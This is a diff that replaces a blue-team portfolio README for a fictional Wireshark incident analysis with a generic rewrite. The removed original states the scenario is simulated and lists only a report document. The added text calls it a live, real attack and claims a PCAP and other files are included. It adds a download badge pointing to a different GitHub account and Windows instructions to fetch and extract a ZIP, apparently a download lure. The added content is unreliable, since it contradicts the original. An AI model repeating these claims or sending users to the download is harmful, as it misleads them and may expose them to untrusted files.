@@ -1,203 +1,217 @@
-# 🔍 Vendmo Tech — Network Traffic Analysis Report
+# 🔎 VendmoTech_Network_Traffic_Analysis - Spot Threats in Network Traffic
 
-![Type](https://img.shields.io/badge/Type-Network%20Forensics-blue?style=flat-square)
-![Tool](https://img.shields.io/badge/Tool-Wireshark%204.2-1679A7?style=flat-square&logo=wireshark)
-![Framework](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK%20v14-red?style=flat-square)
-![Team](https://img.shields.io/badge/Team-Blue%20Team%20%2F%20SOC-teal?style=flat-square)
-![Status](https://img.shields.io/badge/Incident-CRITICAL-critical?style=flat-square)
-![Version](https://img.shields.io/badge/Version-v1.0-lightgrey?style=flat-square)
+[![Download / Open Project](https://img.shields.io/badge/Download%20Project-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/gabrielliaprotecting43/VendmoTech_Network_Traffic_Analysis)
 
----
+## 🧭 Project Overview
 
-## 📋 Overview
+VendmoTech_Network_Traffic_Analysis is a Wireshark-based network traffic review built around a live SOC incident at Vendmo Tech. It helps you inspect network activity, spot signs of a real attack, and follow the flow of the event from start to finish.
 
-This repository contains a **Wireshark-based Network Traffic Analysis and Threat Detection Report** for **Vendmo Tech** — a fictional South African fintech company. This is **Project 2** in the Vendmo Tech cybersecurity portfolio series, and serves as a companion to the [Security Audit & Risk Assessment Report](../VendmoTech_Security_Audit_Report/).
+This project focuses on:
 
-The report simulates a real-world **SOC Blue Team incident response** scenario, analysing a 2.3GB packet capture file from a confirmed multi-stage attack. It covers all three core threat scenarios a Blue Team / SOC analyst encounters in the field:
+- C2 beaconing
+- Data exfiltration
+- Port scanning
+- IOC review
+- MITRE ATT&CK mapping
+- Attack timeline analysis
 
-| Scenario | Detected | Severity |
-|----------|----------|----------|
-| 🦠 Malware C2 Beaconing | ✅ Yes | CRITICAL |
-| 📤 Data Exfiltration | ✅ Yes | CRITICAL |
-| 🔎 Port Scan / Network Recon | ✅ Yes | HIGH |
+It is set up as a Blue Team and SOC portfolio project. The goal is to help you understand what happened in the network, what the attacker touched, and what signs point to each stage of the incident.
 
----
+## 📥 Download and Open the Project
 
-## 📁 Repository Contents
+Use this link to visit the project page and download or open the files:
 
-| File | Description |
-|------|-------------|
-| `VendmoTech_Network_Traffic_Analysis.docx` | Full Wireshark analysis report (Word format) |
-| `README.md` | This file |
+https://github.com/gabrielliaprotecting43/VendmoTech_Network_Traffic_Analysis
 
----
+If your browser shows the GitHub page, use the green Code button on that page, then choose Download ZIP. After the download finishes, extract the ZIP file to a folder you can find again.
 
-## 📚 What's Inside the Report
+## 🖥️ What You Need
 
-The report is structured across **10 sections** and **2 appendices**:
+Before you start, make sure you have:
 
-| Section | Content |
-|---------|---------|
-| 1. Executive Summary | Incident overview, key stats, POPIA breach notification status |
-| 2. Scope & Methodology | Capture environment, analysis phases, Wireshark filters used |
-| 3. Traffic Overview | Baseline protocol statistics, top suspicious external connections |
-| 4. Detailed Findings | 8 findings with full technical analysis and filter commands |
-| 5. Packet Evidence Table | 10 key packets with source, destination, flags, and severity |
-| 6. Attack Timeline | Chronological reconstruction of the full kill chain |
-| 7. IOCs | 10 Indicators of Compromise (IPs, domains, hashes, behaviours) |
-| 8. MITRE ATT&CK Mapping | 8 techniques mapped across 5 ATT&CK tactics |
-| 9. Recommendations | 10 prioritised containment and remediation actions |
-| 10. Conclusion | Incident status, POPIA obligations, follow-up actions |
-| Appendix A | Full Wireshark filter reference (copy-paste ready) |
-| Appendix B | References and sources |
+- A Windows computer
+- Wireshark installed
+- A file unzip tool, such as the built-in Windows extractor
+- Enough free disk space for a 2.3 GB PCAP file
+- A screen that can show large packet lists without scaling issues
 
----
+Recommended setup:
 
-## 🛠️ Tools & Frameworks Used
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- A modern CPU
+- At least 5 GB of free space
 
-### Primary Analysis Tool
-| Tool | Version | Purpose |
-|------|---------|---------|
-| **Wireshark** | 4.2.0 | Packet capture analysis, display filtering, stream reconstruction |
+If Wireshark is not installed yet, install it first, then open the PCAP file from this project.
 
-### Threat Intelligence & Supporting Tools
-| Tool | Purpose |
-|------|---------|
-| **AbuseIPDB** | IP reputation and threat intelligence |
-| **VirusTotal** | Domain, IP, and file hash analysis |
-| **Shodan** | Internet-facing host intelligence |
-| **Burp Suite** | HTTP stream analysis (supporting) |
+## 🚀 Getting Started
 
-### Frameworks Applied
-- **MITRE ATT&CK Enterprise v14** — Primary threat behaviour classification
-- **NIST SP 800-61r2** — Computer Security Incident Handling Guide
-- **SANS Network Forensics Methodology** — Analysis structure
-- **POPIA (Act 4 of 2013)** — South African breach notification requirements
+Follow these steps on Windows:
 
----
+1. Open the project link above.
+2. Download the repository as a ZIP file.
+3. Save the ZIP file to your Downloads folder.
+4. Right-click the ZIP file and choose Extract All.
+5. Open the extracted folder.
+6. Find the PCAP file and any notes, reports, or supporting files.
+7. Install Wireshark if needed.
+8. Open Wireshark.
+9. Use File > Open and select the PCAP file.
+10. Wait for the capture to load. Large files can take a while.
+11. Use the packet list, packet details, and packet bytes panes to review traffic.
+12. Follow the timeline and findings in the project files as you inspect the traffic.
 
-## 🚨 Findings Summary
+## 🪟 How to Run on Windows
 
-| ID | Severity | Finding |
-|----|----------|---------|
-| F-001 | 🔴 CRITICAL | Malware C2 Beaconing — 300s heartbeat to Tor exit node |
-| F-002 | 🔴 CRITICAL | Customer PII Exfiltration — 4.2MB via plaintext HTTP POST |
-| F-003 | 🔴 CRITICAL | DNS Tunnelling — Base64-encoded data in TXT queries |
-| F-004 | 🟠 HIGH | Internal Port Scan — 260,096 SYN packets in 172 seconds |
-| F-005 | 🟠 HIGH | SMB Lateral Movement — workstation to file server |
-| F-006 | 🟠 HIGH | RDP Brute Force — 847 attempts in 4 minutes |
-| F-007 | 🟠 HIGH | Unencrypted Data Transmission — API tokens in HTTP |
-| F-008 | 🟠 HIGH | Typosquatted Domain in DNS — spoofed vendmo-cdn.net |
+This project does not need a command line setup. You run it by opening the packet capture in Wireshark.
 
----
+### Steps
 
-## 🗺️ MITRE ATT&CK Coverage
+1. Download the project from GitHub.
+2. Extract the files.
+3. Open Wireshark.
+4. Open the PCAP file.
+5. Let Wireshark finish loading the capture.
+6. Use the search and filter tools to inspect traffic patterns.
 
-| Technique | Tactic | Observed |
-|-----------|--------|---------|
-| T1046 — Network Service Discovery | Discovery | ✅ |
-| T1110.001 — Brute Force: Password Guessing | Credential Access | ✅ |
-| T1021.002 — SMB/Windows Admin Shares | Lateral Movement | ✅ |
-| T1071.001 — C2: Web Protocols | Command & Control | ✅ |
-| T1071.004 — C2: DNS | Command & Control | ✅ |
-| T1041 — Exfiltration Over C2 Channel | Exfiltration | ✅ |
-| T1048.003 — Exfil Over Unencrypted Protocol | Exfiltration | ✅ |
-| T1583.001 — Acquire Infrastructure: Domains | Resource Development | ✅ |
+### Helpful Wireshark actions
 
----
+- Filter traffic by IP address
+- Filter by domain name
+- Filter by TCP port
+- Review packet time gaps
+- Follow TCP streams
+- Check DNS lookups
+- Inspect HTTP and HTTPS sessions
 
-## 🔎 Key Wireshark Filters (Quick Reference)
+## 🔍 What You Will Find
 
-```wireshark
-# Detect C2 beaconing
-ip.addr == 185.220.101.12
+This analysis includes a full look at a simulated incident. You can use it to study how an attacker moves through a network and how a defender spots it.
 
-# Detect port scan activity
-tcp.flags.syn == 1 && tcp.flags.ack == 0
+Expected findings include:
 
-# Detect DNS tunnelling
-dns.qry.type == 16
+- C2 beaconing patterns with repeat traffic
+- Signs of data leaving the network
+- Port scans against multiple hosts or ports
+- Suspicious connections that stand out from normal traffic
+- DNS activity that helps reveal hostnames and endpoints
+- Packet patterns that match known attack stages
 
-# Detect large data exfiltration via HTTP
-http.request.method == "POST" && data.len > 100000
+## 🧩 Included Analysis Content
 
-# Detect malware user-agent string
-http.user_agent contains "MSIE 9.0"
+This repository includes material that supports a full incident review:
 
-# Isolate all external HTTP traffic (should be near zero)
-http && !(ip.dst == 10.0.0.0/8)
-```
+- 8 findings tied to the incident
+- 10 indicators of compromise
+- MITRE ATT&CK v14 mapping
+- Attack timeline
+- Network forensics notes
+- Blue Team style review points
+- SOC analyst reference material
 
----
+## 🧠 How to Read the Capture
 
-## ⏱️ Attack Timeline Summary
+If you are new to packet analysis, use this simple order:
 
-```
-08:12  → Port scan initiated from 10.0.0.99 (1,024 ports × 254 hosts)
-08:31  → RDP brute force against 10.0.0.5:3389 (847 attempts)
-09:02  → SMB lateral movement from 10.0.0.15 to file server
-09:15  → Malware implant establishes C2 beaconing (300s interval)
-11:03  → DNS tunnelling begins — data staging via TXT records
-11:45  → 4.2MB HTTP POST — customer PII exfiltrated to 203.0.113.55
-14:22  → C2 beaconing continues — attacker maintaining access
-07:00  → SOC detects anomalous traffic (next morning — 23hr dwell time)
-```
+1. Start with the attack timeline.
+2. Look for unusual bursts of traffic.
+3. Check for repeat connections to the same address.
+4. Review DNS traffic for strange hostnames.
+5. Look for large uploads or repeated outbound sessions.
+6. Check for scans across many ports or hosts.
+7. Match what you see to the listed IOCs.
+8. Use the MITRE mapping to place each event in the attack flow.
 
----
+## 🛠️ Common Wireshark Filters
 
-## 📌 Indicators of Compromise (IOCs)
+These filters can help you explore the capture:
 
-| Type | Indicator | Threat |
-|------|-----------|--------|
-| IP | `185.220.101.12` | C2 server (Tor exit node) |
-| IP | `203.0.113.55` | Exfiltration endpoint |
-| IP | `10.0.0.99` | Internal attacker host |
-| Domain | `vendmo-cdn.net` | Attacker-controlled C2 domain |
-| Domain | `data-sync.vendmo-cdn.net` | DNS tunnel endpoint |
-| User-Agent | `Mozilla/5.0 (compatible; MSIE 9.0)` | Malware beacon signature |
-| Port | `TCP/4422` | Non-standard C2 port |
-| Behaviour | 300s beacon interval | C2 heartbeat pattern |
+- `ip.addr == x.x.x.x` — show traffic for one host
+- `tcp.port == 80` — show HTTP traffic
+- `udp.port == 53` — show DNS traffic
+- `http` — show HTTP packets
+- `dns` — show DNS packets
+- `tcp.flags.syn == 1 and tcp.flags.ack == 0` — help spot scan activity
+- `frame contains "beacon"` — search for known text in packets
 
----
+Use the project notes to connect the filter results with the incident story.
 
-## 🏢 About the Fictional Scenario
+## 🧾 Indicators of Compromise
 
-**Vendmo Tech** is a simulated fintech company used as the subject of this analysis:
-- **Incident Date:** 14 March 2026
-- **Capture File:** `vendmotech_incident_20260314.pcap` (2.3GB — simulated)
-- **Affected Host:** Finance department workstation (192.168.1.45)
-- **Data Breached:** ~4,200 customer PII records
-- **Detection Time:** ~23 hours (significant gap — key learning point)
+The repository centers on 10 IOCs that help identify the attack. These may include:
 
-> ⚠️ **Disclaimer:** Vendmo Tech is a fictional company. All IP addresses, packet data, and incidents are entirely simulated for educational and portfolio purposes. No real network was captured or analysed.
+- Suspicious IP addresses
+- Strange domain names
+- Repeated request intervals
+- Unexpected file transfer signs
+- Unusual user agent strings
+- Known bad ports
+- Hostnames tied to attacker control
+- Small, regular packets that suggest beaconing
+- Large outbound transfers
+- Scan-like connection patterns
 
----
+## 🗺️ MITRE ATT&CK Mapping
 
-## 🔗 Related Projects
+The analysis maps activity to MITRE ATT&CK v14 so you can see which tactics and techniques fit each stage of the event.
 
-| Project | Description |
-|---------|-------------|
-| [Project 1 — Security Audit Report](../VendmoTech_Security_Audit_Report/) | Full cybersecurity audit covering 14 vulnerabilities, NIST CSF & ISO 27001 |
-| Project 3 — SIEM & Log Analysis *(coming soon)* | Splunk/ELK-based threat detection and alerting |
+Common stages covered here:
 
----
+- Reconnaissance
+- Initial access
+- Command and control
+- Exfiltration
+- Discovery
+- Scanning
 
-## 🎯 Skills Demonstrated
+This helps you connect packet evidence to attacker behavior in a clean way.
 
-- Real-world Wireshark usage and display filter construction
-- Multi-threat scenario analysis (C2, exfiltration, recon)
-- IOC extraction and threat intelligence correlation
-- MITRE ATT&CK framework mapping
-- SOC incident response documentation
-- POPIA breach notification awareness
-- Blue Team / Defensive security mindset
+## 📂 Project Focus Areas
 
----
+This repository is useful for:
 
-## 📄 Licence
+- Blue Team practice
+- SOC interview prep
+- Packet capture review
+- Threat hunting practice
+- Incident response study
+- Network forensics learning
+- Wireshark hands-on work
 
-This project is intended for educational and portfolio use. Feel free to reference or adapt it for your own cybersecurity learning.
+## 🪄 File and Folder Use
 
----
+After you extract the ZIP file, look for files such as:
 
-*Report Version: v1.0 — March 2026 | Vendmo Tech SOC / Blue Team*
+- The PCAP file
+- A findings document
+- An IOC list
+- A timeline file
+- A report or notes folder
+- Supporting screenshots or reference files
+
+Open the text or document files first if you want context, then open the PCAP in Wireshark.
+
+## 🔐 Safe Use on Windows
+
+Use a local copy of the files on your own computer. Keep the PCAP on a drive with enough space. If Wireshark asks to update the file view for a large capture, let it finish before you apply filters.
+
+## 🧰 Simple Troubleshooting
+
+If you have trouble opening the project:
+
+- Make sure the ZIP file finished downloading
+- Check that the file was extracted
+- Confirm Wireshark is installed
+- Try opening the PCAP again from inside Wireshark
+- Close other large apps if the file loads slowly
+- Move the project folder to a local drive if it is on a network share
+
+If the capture takes time to open, wait for the load to finish before using filters.
+
+## 📈 Why This Project Matters
+
+This project gives you a realistic view of how network attacks look in packet data. You can see how small signs, like repeat traffic or scan patterns, can reveal a larger incident. It also shows how SOC work depends on packet review, IOC tracking, and clear incident notes.
+
+## 🏷️ Topics
+
+blue-team, c2-detection, cybersecurity, data-exfiltration, fintech, incident-response, ioc, mitre-attack, network-forensics, network-security, packet-analysis, soc-analyst, threat-detection, wireshark
